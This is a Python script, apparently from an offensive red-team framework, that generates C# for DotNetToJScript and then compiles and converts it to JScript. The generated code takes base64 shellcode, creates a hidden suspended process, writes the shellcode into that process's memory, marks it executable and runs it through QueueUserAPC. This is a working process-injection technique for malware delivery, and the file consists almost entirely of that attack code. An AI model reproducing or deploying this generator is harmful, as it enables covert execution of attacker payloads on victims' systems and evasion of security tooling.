"""
    Generators various code snippets, primarily used for DotNetToJScript.
"""
# from lib.common import helpers
# from Tools.Bypass.bypass_common import bypass_helpers
import os

def genCSharpShellCodeMigration():
    
    code = ""
    num_tabs = 0

    className = "TestClass"
    processMigrate = "Migrate"
    processMigratex86 = "x86"
    processMigratex64 = "x64"
    processMigrateProcessPath = "processpath"
    processMigrateShellcode = "s"
    shellCode = "shellcode"
    startupInfo = "startupinfo"
    processInformation = "processInformation"
    success = "success"
    resultPtr = "resultPtr"
    bytesWritten = "bytesWritten"
    resultBool = "resultBool"
    oldProtect = "oldProtect"
    targetProc = "targetProc"
    currentThreads = "currentThreads"
    sht = "sht"
    ptr = "ptr"
    ThreadHandle = "ThreadHandle"

    code += "using System; using System.Diagnostics; using System.Reflection; using System.Runtime.InteropServices;\n\n"
    code += "[ComVisible(true)]\n"
    code += "public class {0}\n".format(className)
    code += "{\n"

    num_tabs += 1

    code += "\t" * num_tabs + "public {0}()\n".format(className)
    code += "\t" * num_tabs + "{\n\n"
    code += "\t" * num_tabs + "}\n\n"
    code += "\t" * num_tabs + "public void {0}(string {1}, string {2}, string {3})\n".format(processMigrate, processMigratex86, processMigratex64, processMigrateProcessPath)
    code += "\t" * num_tabs + "{\n"
    code += "\t" * num_tabs + "\tstring {0};\n\n".format(processMigrateShellcode)
    code += "\t" * num_tabs + "\tif(IntPtr.Size == 4)\n"
    code += "\t" * num_tabs + "\t{\n"
    code += "\t" * num_tabs + "\t\t{0} = {1};\n".format(processMigrateShellcode, processMigratex86)
    code += "\t" * num_tabs + "\t}\n"
    code += "\t" * num_tabs + "\telse\n"
    code += "\t" * num_tabs + "\t{\n"
    code += "\t" * num_tabs + "\t\t{0} = {1};\n".format(processMigrateShellcode, processMigratex64)
    code += "\t" * num_tabs + "\t}\n\n"
    code += "\t" * num_tabs + "\tbyte[] {0} = Convert.FromBase64String({1});\n".format(shellCode, processMigrateShellcode)
    code += "\t" * num_tabs + "\tSTARTUPINFO {0} = new STARTUPINFO();\n".format(startupInfo)
    code += "\t" * num_tabs + "\tPROCESS_INFORMATION {0} = new PROCESS_INFORMATION();\n".format(processInformation)
    code += "\t" * num_tabs + "\tbool {0} = CreateProcess({1}, null, IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_SUSPENDED | ProcessCreationFlags.CREATE_NO_WINDOW , IntPtr.Zero, null, ref {2}, out {3});\n".format(success, processMigrateProcessPath, startupInfo, processInformation)
    code += "\t" * num_tabs + "\tIntPtr {0} = VirtualAllocEx({1}.hProcess, IntPtr.Zero, {2}.Length, MEM_COMMIT, PAGE_READWRITE);\n".format(resultPtr, processInformation, shellCode)
    code += "\t" * num_tabs + "\tIntPtr {0} = IntPtr.Zero;\n".format(bytesWritten)
    code += "\t" * num_tabs + "\tbool {0} = WriteProcessMemory({1}.hProcess,{2},{3},{4}.Length, out {5});\n".format(resultBool, processInformation, resultPtr, shellCode, shellCode, bytesWritten)
    code += "\t" * num_tabs + "\tuint {0} = 0;\n".format(oldProtect)
    code += "\t" * num_tabs + "\t{0} = VirtualProtectEx({1}.hProcess, {2}, {3}.Length, PAGE_EXECUTE_READ, out {4} );\n".format(resultBool, processInformation, resultPtr, shellCode, oldProtect)
    code += "\t" * num_tabs + "\tProcess {0} = Process.GetProcessById((int){1}.dwProcessId);\n".format(targetProc, processInformation)
    code += "\t" * num_tabs + "\tProcessThreadCollection {0} = {1}.Threads;\n".format(currentThreads, targetProc)
    code += "\t" * num_tabs + "\tIntPtr {0} = OpenThread(ThreadAccess.SET_CONTEXT, false, {1}[0].Id);\n".format(sht, currentThreads)
    code += "\t" * num_tabs + "\tIntPtr {0} = QueueUserAPC({1},{2},IntPtr.Zero);\n".format(ptr, resultPtr, sht)
    code += "\t" * num_tabs + "\tIntPtr {0} = {1}.hThread;\n".format(ThreadHandle, processInformation)
    code += "\t" * num_tabs + "\tResumeThread({0});\n".format(ThreadHandle)
    code += "\t" * num_tabs + "}\n"
    code += """
		private static UInt32 MEM_COMMIT = 0x1000;
		private static UInt32 PAGE_EXECUTE_READ = 0x20;
		private static UInt32 PAGE_READWRITE = 0x04;

		[Flags]
		public enum ProcessAccessFlags : uint
		{
			All = 0x001F0FFF,
			Terminate = 0x00000001,
			CreateThread = 0x00000002,
			VirtualMemoryOperation = 0x00000008,
			VirtualMemoryRead = 0x00000010,
			VirtualMemoryWrite = 0x00000020,
			DuplicateHandle = 0x00000040,
			CreateProcess = 0x000000080,
			SetQuota = 0x00000100,
			SetInformation = 0x00000200,
			QueryInformation = 0x00000400,
			QueryLimitedInformation = 0x00001000,
			Synchronize = 0x00100000
		}
		
		[Flags]
		public enum ProcessCreationFlags : uint
		{
			ZERO_FLAG = 0x00000000,
			CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
			CREATE_DEFAULT_ERROR_MODE = 0x04000000,
			CREATE_NEW_CONSOLE = 0x00000010,
			CREATE_NEW_PROCESS_GROUP = 0x00000200,
			CREATE_NO_WINDOW = 0x08000000,
			CREATE_PROTECTED_PROCESS = 0x00040000,
			CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
			CREATE_SEPARATE_WOW_VDM = 0x00001000,
			CREATE_SHARED_WOW_VDM = 0x00001000,
			CREATE_SUSPENDED = 0x00000004,
			CREATE_UNICODE_ENVIRONMENT = 0x00000400,
			DEBUG_ONLY_THIS_PROCESS = 0x00000002,
			DEBUG_PROCESS = 0x00000001,
			DETACHED_PROCESS = 0x00000008,
			EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
			INHERIT_PARENT_AFFINITY = 0x00010000
		}

		public struct PROCESS_INFORMATION
		{
			public IntPtr hProcess;
			public IntPtr hThread;
			public uint dwProcessId;
			public uint dwThreadId;
		}

		public struct STARTUPINFO
		{
			public uint cb;
			public string lpReserved;
			public string lpDesktop;
			public string lpTitle;
			public uint dwX;
			public uint dwY;
			public uint dwXSize;
			public uint dwYSize;
			public uint dwXCountChars;
			public uint dwYCountChars;
			public uint dwFillAttribute;
			public uint dwFlags;
			public short wShowWindow;
			public short cbReserved2;
			public IntPtr lpReserved2;
			public IntPtr hStdInput;
			public IntPtr hStdOutput;
			public IntPtr hStdError;
		}
		
		[Flags]
		public enum    ThreadAccess : int
		{
			TERMINATE           = (0x0001)  ,
			SUSPEND_RESUME      = (0x0002)  ,
			GET_CONTEXT         = (0x0008)  ,
			SET_CONTEXT         = (0x0010)  ,
			SET_INFORMATION     = (0x0020)  ,
			QUERY_INFORMATION       = (0x0040)  ,
			SET_THREAD_TOKEN    = (0x0080)  ,
			IMPERSONATE         = (0x0100)  ,
			DIRECT_IMPERSONATION    = (0x0200)
		}
		
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
			int dwThreadId);

		
		[DllImport("kernel32.dll",SetLastError = true)]
		public static extern bool WriteProcessMemory(
			IntPtr hProcess,
			IntPtr lpBaseAddress,
			byte[] lpBuffer,
			int nSize,
			out IntPtr lpNumberOfBytesWritten);
		
		[DllImport("kernel32.dll")]
		public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
		
		[DllImport("kernel32.dll", SetLastError = true )]
		public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
		Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

		[DllImport("kernel32.dll")]
		static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
		   int dwSize, uint flNewProtect, out uint lpflOldProtect);
		
		[DllImport("kernel32.dll")]
		public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
								 bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment,
								string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

		[DllImport("kernel32.dll")]
		public static extern uint ResumeThread(IntPtr hThread);

		[DllImport("kernel32.dll")]
		public static extern uint SuspendThread(IntPtr hThread);
        }
        """

    return code

def assemblyToJScript(code):
    with open("/tmp/dotnettojscript.cs", "w") as f:
        f.write(code)

    os.system("mcs -platform:x86 -target:library /tmp/dotnettojscript.cs -out:/tmp/dotnettojscript.dll")
    os.system("WINEPREFIX=/root/.greatsct wine /usr/share/greatsct/DotNetToJScript.exe /tmp/dotnettojscript.dll > /opt/GreatSCT/testaroo.js")
    
assemblyToJScript(genCSharpShellCodeMigration())